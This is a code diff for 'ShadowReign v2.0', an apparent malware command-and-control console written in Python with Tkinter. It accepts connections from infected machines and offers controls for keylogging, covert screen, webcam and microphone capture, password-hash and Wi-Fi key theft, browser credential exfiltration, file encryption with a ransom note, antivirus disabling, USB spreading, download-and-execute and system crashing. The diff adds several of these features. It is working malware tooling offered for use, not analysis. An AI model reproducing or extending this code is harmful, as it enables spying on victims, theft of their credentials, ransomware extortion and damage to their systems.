@@ -10,14 +10,17 @@ from Crypto.Util.Padding import pad, unpad
 from PIL import Image, ImageTk
 import io
 import time
+import hashlib
+import zlib
+import pyaudio
 
 class ShadowReignGUI:
     def __init__(self):
         self.root = tk.Tk()
-        self.root.title("ShadowReign C2 - Elite Control")
-        self.root.geometry("1400x900")
-        self.root.configure(bg="#0A0F1A")  # Dark Kali blue
-        self.root.attributes('-alpha', 0.95)  # Glassy transparency
+        self.root.title("ShadowReign v2.0 - C2 Elite")
+        self.root.geometry("1600x1000")
+        self.root.configure(bg="#0A0F1A")
+        self.root.attributes('-alpha', 0.95)
         self.HOST = "0.0.0.0"
         self.PORT = 5251
         self.KEY = hashlib.sha256(b"ShadowReignBoss!").digest()
@@ -25,6 +28,12 @@ class ShadowReignGUI:
         self.clients_lock = threading.Lock()
         self.selected_client = None
         self.home_dir = os.path.expanduser("~")
+        self.stream_window = None
+        self.screenshot_window = None
+        self.audio_window = None
+        self.webcam_window = None
+        self.audio_stream = None
+        self.audio = pyaudio.PyAudio()
         self.setup_ui()
         self.start_server()
         self.root.mainloop()
@@ -33,40 +42,16 @@ class ShadowReignGUI:
         style = ttk.Style()
         style.theme_use("clam")
         style.configure("TNotebook", background="#0A0F1A", borderwidth=0)
-        style.configure("TNotebook.Tab", 
-                        background="#1C2526", 
-                        foreground="#00FFCC",  # Neon cyan
-                        padding=[25, 12], 
-                        font=("Courier", 14, "bold"),
-                        borderwidth=2, 
-                        bordercolor="#00FFCC")
-        style.map("TNotebook.Tab", 
-                  background=[("selected", "#2E3B4E")], 
-                  foreground=[("selected", "#FFFFFF")])
-        style.configure("Treeview", 
-                        background="#1C2526", 
-                        foreground="#FFFFFF", 
-                        fieldbackground="#1C2526", 
-                        font=("Courier", 12),
-                        rowheight=35)
-        style.configure("Treeview.Heading", 
-                        background="#0A0F1A", 
-                        foreground="#00FFCC", 
-                        font=("Courier", 13, "bold"))
+        style.configure("TNotebook.Tab", background="#1C2526", foreground="#00FFCC", padding=[25, 12], font=("Courier", 14, "bold"), borderwidth=2, bordercolor="#00FFCC")
+        style.map("TNotebook.Tab", background=[("selected", "#2E3B4E")], foreground=[("selected", "#FFFFFF")])
+        style.configure("Treeview", background="#1C2526", foreground="#FFFFFF", fieldbackground="#1C2526", font=("Courier", 12), rowheight=35)
+        style.configure("Treeview.Heading", background="#0A0F1A", foreground="#00FFCC", font=("Courier", 13, "bold"))
 
-        # Sidebar
         sidebar = tk.Frame(self.root, bg="#0A0F1A", width=400, relief="flat", borderwidth=2, highlightbackground="#00FFCC")
         sidebar.pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=10)
-        tk.Label(sidebar, 
-                 text="> TARGETS", 
-                 bg="#0A0F1A", 
-                 fg="#00FFCC", 
-                 font=("Courier", 20, "bold")).pack(pady=(10, 5), padx=10, anchor="w")
+        tk.Label(sidebar, text="> TARGETS", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 20, "bold")).pack(pady=(10, 5), padx=10, anchor="w")
         
-        self.client_list = ttk.Treeview(sidebar, 
-                                        columns=("ID", "IP", "OS", "Status", "Anti-VM"), 
-                                        show="headings", 
-                                        height=15)
+        self.client_list = ttk.Treeview(sidebar, columns=("ID", "IP", "OS", "Status", "Anti-VM"), show="headings", height=20)
         self.client_list.heading("ID", text="ID")
         self.client_list.heading("IP", text="IP")
         self.client_list.heading("OS", text="OS")
@@ -80,14 +65,9 @@ class ShadowReignGUI:
         self.client_list.pack(fill=tk.Y, padx=10, pady=10)
         self.client_list.bind("<<TreeviewSelect>>", self.select_client)
 
-        # Main Frame
         self.main_frame = tk.Frame(self.root, bg="#0A0F1A", relief="flat", borderwidth=2, highlightbackground="#00FFCC")
         self.main_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)
-        tk.Label(self.main_frame, 
-                 text="> SHADOWREIGN C2", 
-                 bg="#0A0F1A", 
-                 fg="#00FFCC", 
-                 font=("Courier", 24, "bold")).pack(pady=(5, 10), anchor="w")
+        tk.Label(self.main_frame, text="> SHADOWREIGN C2", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 24, "bold")).pack(pady=(5, 10), anchor="w")
         
         self.notebook = ttk.Notebook(self.main_frame)
         self.notebook.pack(fill=tk.BOTH, expand=True, pady=5)
@@ -102,7 +82,9 @@ class ShadowReignGUI:
             "Live": self.create_live_tab,
             "Advanced": self.create_advanced_tab,
             "Remote": self.create_remote_tab,
-            "Exploit": self.create_exploit_tab  # New tab for advanced exploits
+            "Exploit": self.create_exploit_tab,
+            "Network": self.create_network_tab,
+            "Pranks": self.create_extra_pranks_tab
         }
         for name, func in tabs.items():
             tab = tk.Frame(self.notebook, bg="#0A0F1A")
@@ -110,22 +92,7 @@ class ShadowReignGUI:
             func(tab)
 
     def create_button(self, parent, text, command):
-        btn = tk.Button(parent, 
-                        text=text, 
-                        command=command, 
-                        bg="#2E3B4E", 
-                        fg="#00FFCC", 
-                        font=("Courier", 12, "bold"), 
-                        bd=2, 
-                        relief="flat", 
-                        highlightbackground="#00FFCC", 
-                        highlightthickness=1, 
-                        padx=20, 
-                        pady=10, 
-                        activebackground="#4A90E2", 
-                        cursor="hand2")
-        btn.pack(pady=8, padx=5, side=tk.LEFT)
-        return btn
+        return tk.Button(parent, text=text, command=command, bg="#2E3B4E", fg="#00FFCC", font=("Courier", 12, "bold"), bd=2, relief="flat", highlightbackground="#00FFCC", highlightthickness=1, padx=20, pady=10, activebackground="#4A90E2", cursor="hand2")
 
     def encrypt(self, data):
         try:
@@ -174,7 +141,7 @@ class ShadowReignGUI:
             try:
                 client_socket, addr = self.server.accept()
                 client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-                client_socket.settimeout(10)
+                client_socket.settimeout(15)
                 ip = addr[0]
                 with self.clients_lock:
                     existing_id = next((cid for cid, (sock, info) in self.clients.items() if info["ip"] == ip), None)
@@ -226,23 +193,38 @@ class ShadowReignGUI:
                 break
 
     def process_response(self, client_id, response):
+        if client_id != self.selected_client:
+            return
         if "keylogs" in response:
             self.update_text(self.keylog_display, response["keylogs"])
-            self.save_to_file("keylogs.txt", response["keylogs"])
         elif "files" in response:
             self.update_text(self.file_display, "\n".join(response["files"]))
         elif "screenshot" in response:
-            self.display_image(response["screenshot"], "screenshot.png")
-        elif "remote_frame" in response and client_id == self.selected_client:
-            self.update_stream(response["remote_frame"])
+            self.show_screenshot(response["screenshot"])
+        elif "screen_rec" in response:
+            self.save_to_file("screen_rec.avi", response["screen_rec"], binary=True)
+        elif "webcam" in response:
+            self.show_webcam(response["webcam"])
+        elif "stream_frame" in response or "remote_frame" in response:
+            self.update_stream(self.stream_label, response.get("stream_frame") or response["remote_frame"])
+        elif "webcam_frame" in response:
+            self.update_stream(self.webcam_label, response["webcam_frame"])
+        elif "mic_frame" in response:
+            self.play_audio(response["mic_frame"])
         elif "shell_output" in response:
-            self.update_text(self.live_shell_output, response["shell_output"])
+            self.update_text(self.shell_output, response["shell_output"])
         elif "creds" in response:
             creds_text = "\n".join([f"{url}: {info['user']} - {info['pass']}" for url, info in response["creds"].items()])
-            self.update_text(self.shell_output, creds_text)
-            self.save_to_file("credentials.txt", creds_text)
+            self.update_text(self.exploit_output, creds_text)
         elif "encrypted" in response:
             self.update_text(self.exploit_output, f"Encrypted: {response['encrypted']} | Key: {response['key']}")
+        elif "sys_info" in response:
+            self.update_text(self.system_output, "\n".join([f"{k}: {v}" for k, v in response["sys_info"].items()]))
+        elif "wifi" in response:
+            wifi_text = "\n".join([f"{ssid}: {key}" for ssid, key in response["wifi"].items()])
+            self.update_text(self.system_output, wifi_text)
+        elif "status" in response:
+            self.update_text(self.system_output, response["status"])
         self.queue_gui_update()
 
     def queue_gui_update(self):
@@ -264,31 +246,70 @@ class ShadowReignGUI:
     def save_to_file(self, filename, data, binary=False):
         filepath = os.path.join(self.home_dir, f"ShadowReign_{filename}")
         mode = "wb" if binary else "w"
+        content = base64.b64decode(data) if binary else data
         with open(filepath, mode) as f:
-            f.write(data)
+            f.write(content)
 
-    def display_image(self, b64_data, filename):
+    def show_screenshot(self, b64_data):
+        if not self.screenshot_window or not self.screenshot_window.winfo_exists():
+            self.screenshot_window = tk.Toplevel(self.root)
+            self.screenshot_window.title("> SCREENSHOT")
+            self.screenshot_window.configure(bg="#0A0F1A")
+            self.screenshot_window.attributes('-alpha', 0.95)
+            self.screenshot_label = tk.Label(self.screenshot_window, bg="#1C2526")
+            self.screenshot_label.pack(pady=10, padx=10)
         img_data = base64.b64decode(b64_data)
         img = Image.open(io.BytesIO(img_data))
-        img.thumbnail((400, 300))
+        img.thumbnail((800, 600))
         photo = ImageTk.PhotoImage(img)
-        self.media_display.configure(image=photo)
-        self.media_display.image = photo
-        self.save_to_file(filename, img_data, binary=True)
+        self.screenshot_label.configure(image=photo)
+        self.screenshot_label.image = photo
 
-    def update_stream(self, b64_data):
-        if hasattr(self, "stream_window") and self.stream_window:
+    def show_webcam(self, b64_data):
+        if not self.webcam_window or not self.webcam_window.winfo_exists():
+            self.webcam_window = tk.Toplevel(self.root)
+            self.webcam_window.title("> WEBCAM SNAP")
+            self.webcam_window.configure(bg="#0A0F1A")
+            self.webcam_window.attributes('-alpha', 0.95)
+            self.webcam_label = tk.Label(self.webcam_window, bg="#1C2526")
+            self.webcam_label.pack(pady=10, padx=10)
+        img_data = base64.b64decode(b64_data)
+        img = Image.open(io.BytesIO(img_data))
+        img.thumbnail((800, 600))
+        photo = ImageTk.PhotoImage(img)
+        self.webcam_label.configure(image=photo)
+        self.webcam_label.image = photo
+
+    def update_stream(self, label, b64_data):
+        if label and label.winfo_exists():
             img_data = base64.b64decode(b64_data)
             img = Image.open(io.BytesIO(img_data))
             img.thumbnail((800, 600))
             photo = ImageTk.PhotoImage(img)
-            self.stream_label.configure(image=photo)
-            self.stream_label.image = photo
+            label.configure(image=photo)
+            label.image = photo
+
+    def play_audio(self, b64_data):
+        if not self.audio_window or not self.audio_window.winfo_exists():
+            self.audio_window = tk.Toplevel(self.root)
+            self.audio_window.title("> LIVE AUDIO")
+            self.audio_window.configure(bg="#0A0F1A")
+            self.audio_window.attributes('-alpha', 0.95)
+            tk.Label(self.audio_window, text="Playing live audio...", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 14)).pack(pady=10)
+            self.audio_stream = self.audio.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True)
+        audio_data = base64.b64decode(b64_data)
+        self.audio_stream.write(audio_data)
 
     def select_client(self, event):
         selected = self.client_list.selection()
         if selected:
             self.selected_client = int(self.client_list.item(selected[0])["values"][0])
+            if self.audio_stream:
+                self.audio_stream.stop_stream()
+                self.audio_stream.close()
+                self.audio_stream = None
+            if self.audio_window and self.audio_window.winfo_exists():
+                self.audio_window.destroy()
 
     def send_command(self, command, data=None):
         if self.selected_client is None:
@@ -303,20 +324,20 @@ class ShadowReignGUI:
         tk.Label(tab, text="> KEYLOGS", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
         btn_frame = tk.Frame(tab, bg="#0A0F1A")
         btn_frame.pack(pady=10)
-        self.create_button(btn_frame, "START", lambda: self.send_command("keylogger_start"))
-        self.create_button(btn_frame, "STOP", lambda: self.send_command("keylogger_stop"))
-        self.create_button(btn_frame, "DUMP", lambda: self.send_command("keylogger_dump"))
-        self.keylog_display = tk.Text(tab, height=15, width=90, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
+        self.create_button(btn_frame, "START", lambda: self.send_command("keylogger_start")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "STOP", lambda: self.send_command("keylogger_stop")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "DUMP", lambda: self.send_command("keylogger_dump")).pack(side=tk.LEFT, padx=5)
+        self.keylog_display = tk.Text(tab, height=15, width=100, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
         self.keylog_display.pack(pady=15)
 
     def create_files_tab(self, tab):
         tk.Label(tab, text="> FILES", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
         btn_frame = tk.Frame(tab, bg="#0A0F1A")
         btn_frame.pack(pady=10)
-        self.create_button(btn_frame, "LIST", lambda: self.send_command("list_files"))
-        self.create_button(btn_frame, "UPLOAD", self.upload_file)
-        self.create_button(btn_frame, "DOWNLOAD", self.download_file)
-        self.file_display = tk.Text(tab, height=15, width=90, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
+        self.create_button(btn_frame, "LIST", lambda: self.send_command("list_files", tk.simpledialog.askstring("Path", "Enter path:"))).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "UPLOAD", self.upload_file).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "DOWNLOAD", self.download_file).pack(side=tk.LEFT, padx=5)
+        self.file_display = tk.Text(tab, height=15, width=100, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
         self.file_display.pack(pady=15)
 
     def upload_file(self):
@@ -337,87 +358,88 @@ class ShadowReignGUI:
         tk.Label(tab, text="> MEDIA", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
         btn_frame = tk.Frame(tab, bg="#0A0F1A")
         btn_frame.pack(pady=10)
-        self.create_button(btn_frame, "SCREENSHOT", lambda: self.send_command("screenshot"))
-        self.create_button(btn_frame, "RECORD SCREEN", lambda: self.send_command("record_screen"))
-        self.create_button(btn_frame, "WEBCAM SNAP", lambda: self.send_command("webcam_snap"))
-        self.media_display = tk.Label(tab, bg="#1C2526", bd=0)
-        self.media_display.pack(pady=15)
+        self.create_button(btn_frame, "SCREENSHOT", lambda: self.send_command("screenshot")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "VIEW SCREEN", self.start_screen_stream).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "RECORD SCREEN", lambda: self.send_command("record_screen", tk.simpledialog.askinteger("Duration", "Seconds:"))).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "WEBCAM SNAP", lambda: self.send_command("webcam_snap")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "RECORD A/V", lambda: self.send_command("record_av", tk.simpledialog.askinteger("Duration", "Seconds:"))).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "STOP STREAM", lambda: self.send_command("stop_stream")).pack(side=tk.LEFT, padx=5)
+
+    def start_screen_stream(self):
+        if not self.stream_window or not self.stream_window.winfo_exists():
+            self.stream_window = tk.Toplevel(self.root)
+            self.stream_window.title("> LIVE SCREEN")
+            self.stream_window.configure(bg="#0A0F1A")
+            self.stream_window.attributes('-alpha', 0.95)
+            self.stream_label = tk.Label(self.stream_window, bg="#1C2526")
+            self.stream_label.pack(pady=10, padx=10)
+        self.send_command("stream_screen")
 
     def create_system_tab(self, tab):
         tk.Label(tab, text="> SYSTEM", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
         btn_frame = tk.Frame(tab, bg="#0A0F1A")
         btn_frame.pack(pady=10)
-        self.create_button(btn_frame, "DUMP HASHES", lambda: self.send_command("dump_hashes"))
-        self.create_button(btn_frame, "STEAL WIFI", lambda: self.send_command("steal_wifi"))
-        self.create_button(btn_frame, "ELEVATE", lambda: self.send_command("elevate_privileges"))
-        self.create_button(btn_frame, "TOGGLE ANTI-VM", self.toggle_anti_vm)
-
-    def toggle_anti_vm(self):
-        if self.selected_client is not None:
-            with self.clients_lock:
-                current_state = self.clients[self.selected_client][1]["anti_vm"]
-            self.send_command("toggle_anti_vm", not current_state)
+        self.create_button(btn_frame, "DUMP HASHES", lambda: self.send_command("dump_hashes")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "STEAL WIFI", lambda: self.send_command("steal_wifi")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "ELEVATE", lambda: self.send_command("elevate_privileges")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "SYSTEM INFO", lambda: self.send_command("system_info")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "KILL PROCESS", lambda: self.send_command("kill_process", tk.simpledialog.askstring("PID", "Enter PID:"))).pack(side=tk.LEFT, padx=5)
+        self.system_output = tk.Text(tab, height=15, width=100, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
+        self.system_output.pack(pady=15)
 
     def create_pranks_tab(self, tab):
         tk.Label(tab, text="> CHAOS", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
         btn_frame = tk.Frame(tab, bg="#0A0F1A")
         btn_frame.pack(pady=10)
-        self.create_button(btn_frame, "JUMPSCARE", lambda: self.send_command("jumpscare"))
-        self.create_button(btn_frame, "CRASH", lambda: self.send_command("crash_system"))
-        self.create_button(btn_frame, "FORK BOMB", lambda: self.send_command("fork_bomb"))
-        self.create_button(btn_frame, "FAKE ALERT", self.fake_alert)
-
-    def fake_alert(self):
-        message = tk.simpledialog.askstring("Fake Alert", "Enter alert message:")
-        if message:
-            self.send_command("fake_alert", {"message": message})
+        self.create_button(btn_frame, "JUMPSCARE", lambda: self.send_command("jumpscare")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "CRASH", lambda: self.send_command("crash_system")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "FORK BOMB", lambda: self.send_command("fork_bomb")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "LOCK SCREEN", lambda: self.send_command("lock_screen")).pack(side=tk.LEFT, padx=5)
 
     def create_shell_tab(self, tab):
         tk.Label(tab, text="> LIVE SHELL", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
         self.shell_input = tk.Entry(tab, width=60, bg="#1C2526", fg="#FFFFFF", font=("Courier", 12), insertbackground="#00FFCC", bd=0)
         self.shell_input.pack(pady=10)
-        self.create_button(tab, "EXECUTE", lambda: self.send_command("live_shell_cmd", self.shell_input.get()))
-        self.live_shell_output = tk.Text(tab, height=15, width=90, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
-        self.live_shell_output.pack(pady=15)
-        self.send_command("live_shell")
+        btn_frame = tk.Frame(tab, bg="#0A0F1A")
+        btn_frame.pack(pady=10)
+        self.create_button(btn_frame, "EXECUTE", lambda: self.send_command("live_shell_cmd", self.shell_input.get())).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "START SHELL", lambda: self.send_command("live_shell")).pack(side=tk.LEFT, padx=5)
+        self.shell_output = tk.Text(tab, height=15, width=100, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
+        self.shell_output.pack(pady=15)
 
     def create_live_tab(self, tab):
         tk.Label(tab, text="> LIVE STREAMS", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
         btn_frame = tk.Frame(tab, bg="#0A0F1A")
         btn_frame.pack(pady=10)
-        self.create_button(btn_frame, "STREAM SCREEN", self.start_screen_stream)
-        self.create_button(btn_frame, "STREAM WEBCAM", lambda: self.send_command("stream_webcam"))
-        self.create_button(btn_frame, "STREAM MIC", lambda: self.send_command("stream_mic"))
-        self.create_button(btn_frame, "STOP", lambda: self.send_command("stop_stream"))
+        self.create_button(btn_frame, "SCREEN", self.start_screen_stream).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "WEBCAM", self.start_webcam_stream).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "MIC", lambda: self.send_command("stream_mic")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "STOP", lambda: self.send_command("stop_stream")).pack(side=tk.LEFT, padx=5)
 
-    def start_screen_stream(self):
-        self.send_command("remote_desktop", {"action": "start"})
-        self.stream_window = tk.Toplevel(self.root)
-        self.stream_window.title("> LIVE SCREEN")
-        self.stream_window.configure(bg="#0A0F1A")
-        self.stream_window.attributes('-alpha', 0.95)
-        self.stream_label = tk.Label(self.stream_window, bg="#1C2526")
-        self.stream_label.pack(pady=10, padx=10)
+    def start_webcam_stream(self):
+        if not self.webcam_window or not self.webcam_window.winfo_exists():
+            self.webcam_window = tk.Toplevel(self.root)
+            self.webcam_window.title("> LIVE WEBCAM")
+            self.webcam_window.configure(bg="#0A0F1A")
+            self.webcam_window.attributes('-alpha', 0.95)
+            self.webcam_label = tk.Label(self.webcam_window, bg="#1C2526")
+            self.webcam_label.pack(pady=10, padx=10)
+        self.send_command("stream_webcam")
 
     def create_advanced_tab(self, tab):
         tk.Label(tab, text="> ADVANCED", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
         btn_frame = tk.Frame(tab, bg="#0A0F1A")
         btn_frame.pack(pady=10)
-        self.create_button(btn_frame, "INJECT", self.inject_process)
-        self.create_button(btn_frame, "SELF-DESTRUCT", lambda: self.send_command("self_destruct"))
-        self.create_button(btn_frame, "HARVEST CREDS", lambda: self.send_command("harvest_creds"))
-
-    def inject_process(self):
-        process_name = tk.simpledialog.askstring("Inject Process", "Enter process name (e.g., svchost.exe):")
-        if process_name:
-            self.send_command("inject", process_name)
+        self.create_button(btn_frame, "INJECT", lambda: self.send_command("inject", tk.simpledialog.askstring("Process", "Enter process name:"))).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "SELF-DESTRUCT", lambda: self.send_command("self_destruct")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "TOGGLE ANTI-VM", lambda: self.send_command("toggle_anti_vm", not self.clients[self.selected_client][1]["anti_vm"])).pack(side=tk.LEFT, padx=5)
 
     def create_remote_tab(self, tab):
         tk.Label(tab, text="> REMOTE DESKTOP", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
         btn_frame = tk.Frame(tab, bg="#0A0F1A")
         btn_frame.pack(pady=10)
-        self.create_button(btn_frame, "START", lambda: self.send_command("remote_desktop", {"action": "start"}))
-        self.create_button(btn_frame, "STOP", lambda: self.send_command("stop_stream"))
+        self.create_button(btn_frame, "START", lambda: self.send_command("remote_desktop", {"action": "start"})).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "STOP", lambda: self.send_command("stop_stream")).pack(side=tk.LEFT, padx=5)
         
         control_frame = tk.Frame(tab, bg="#0A0F1A")
         control_frame.pack(pady=10)
@@ -427,15 +449,15 @@ class ShadowReignGUI:
         tk.Label(control_frame, text="Y:", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 12)).pack(side=tk.LEFT, padx=5)
         self.remote_y = tk.Entry(control_frame, width=8, bg="#1C2526", fg="#FFFFFF", font=("Courier", 12), insertbackground="#00FFCC", bd=0)
         self.remote_y.pack(side=tk.LEFT, padx=5)
-        self.create_button(control_frame, "MOVE", self.move_mouse)
-        self.create_button(control_frame, "CLICK", lambda: self.move_mouse(click=True))
+        self.create_button(control_frame, "MOVE", self.move_mouse).pack(side=tk.LEFT, padx=5)
+        self.create_button(control_frame, "CLICK", lambda: self.move_mouse(click=True)).pack(side=tk.LEFT, padx=5)
         
         key_frame = tk.Frame(tab, bg="#0A0F1A")
         key_frame.pack(pady=10)
         tk.Label(key_frame, text="KEY:", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 12)).pack(side=tk.LEFT, padx=5)
         self.remote_key = tk.Entry(key_frame, width=8, bg="#1C2526", fg="#FFFFFF", font=("Courier", 12), insertbackground="#00FFCC", bd=0)
         self.remote_key.pack(side=tk.LEFT, padx=5)
-        self.create_button(key_frame, "PRESS", self.press_key)
+        self.create_button(key_frame, "PRESS", self.press_key).pack(side=tk.LEFT, padx=5)
 
     def move_mouse(self, click=False):
         try:
@@ -454,11 +476,29 @@ class ShadowReignGUI:
         tk.Label(tab, text="> EXPLOITS", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
         btn_frame = tk.Frame(tab, bg="#0A0F1A")
         btn_frame.pack(pady=10)
-        self.create_button(btn_frame, "ENCRYPT FILES", lambda: self.send_command("encrypt_files"))
-        self.create_button(btn_frame, "EXFIL BROWSER", lambda: self.send_command("exfil_browser"))
-        self.create_button(btn_frame, "DISABLE AV", lambda: self.send_command("disable_av"))
-        self.exploit_output = tk.Text(tab, height=15, width=90, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
+        self.create_button(btn_frame, "ENCRYPT FILES", lambda: self.send_command("encrypt_files")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "EXFIL BROWSER", lambda: self.send_command("exfil_browser")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "DISABLE AV", lambda: self.send_command("disable_av")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "HARVEST CREDS", lambda: self.send_command("harvest_creds")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "RANSOM NOTE", lambda: self.send_command("ransom_note", {"message": tk.simpledialog.askstring("Note", "Enter ransom message:")})).pack(side=tk.LEFT, padx=5)
+        self.exploit_output = tk.Text(tab, height=15, width=100, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
         self.exploit_output.pack(pady=15)
+
+    def create_network_tab(self, tab):
+        tk.Label(tab, text="> NETWORK", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
+        btn_frame = tk.Frame(tab, bg="#0A0F1A")
+        btn_frame.pack(pady=10)
+        self.create_button(btn_frame, "SPREAD USB", lambda: self.send_command("spread_usb")).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "DOWNLOAD & EXEC", lambda: self.send_command("download_execute", {"url": tk.simpledialog.askstring("URL", "Enter URL:")})).pack(side=tk.LEFT, padx=5)
+
+    def create_extra_pranks_tab(self, tab):
+        tk.Label(tab, text="> EXTRA PRANKS", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
+        btn_frame = tk.Frame(tab, bg="#0A0F1A")
+        btn_frame.pack(pady=10)
+        self.create_button(btn_frame, "FAKE ALERT", lambda: self.send_command("fake_alert", {"message": tk.simpledialog.askstring("Message", "Enter alert text:")})).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "DISABLE INPUT", lambda: self.send_command("disable_input", tk.simpledialog.askinteger("Duration", "Seconds:"))).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "OPEN URL", lambda: self.send_command("open_url", tk.simpledialog.askstring("URL", "Enter URL:"))).pack(side=tk.LEFT, padx=5)
+        self.create_button(btn_frame, "PLAY SOUND", lambda: self.send_command("play_sound", tk.simpledialog.askstring("Text", "Enter text to speak:"))).pack(side=tk.LEFT, padx=5)
 
 if __name__ == "__main__":
     ShadowReignGUI()
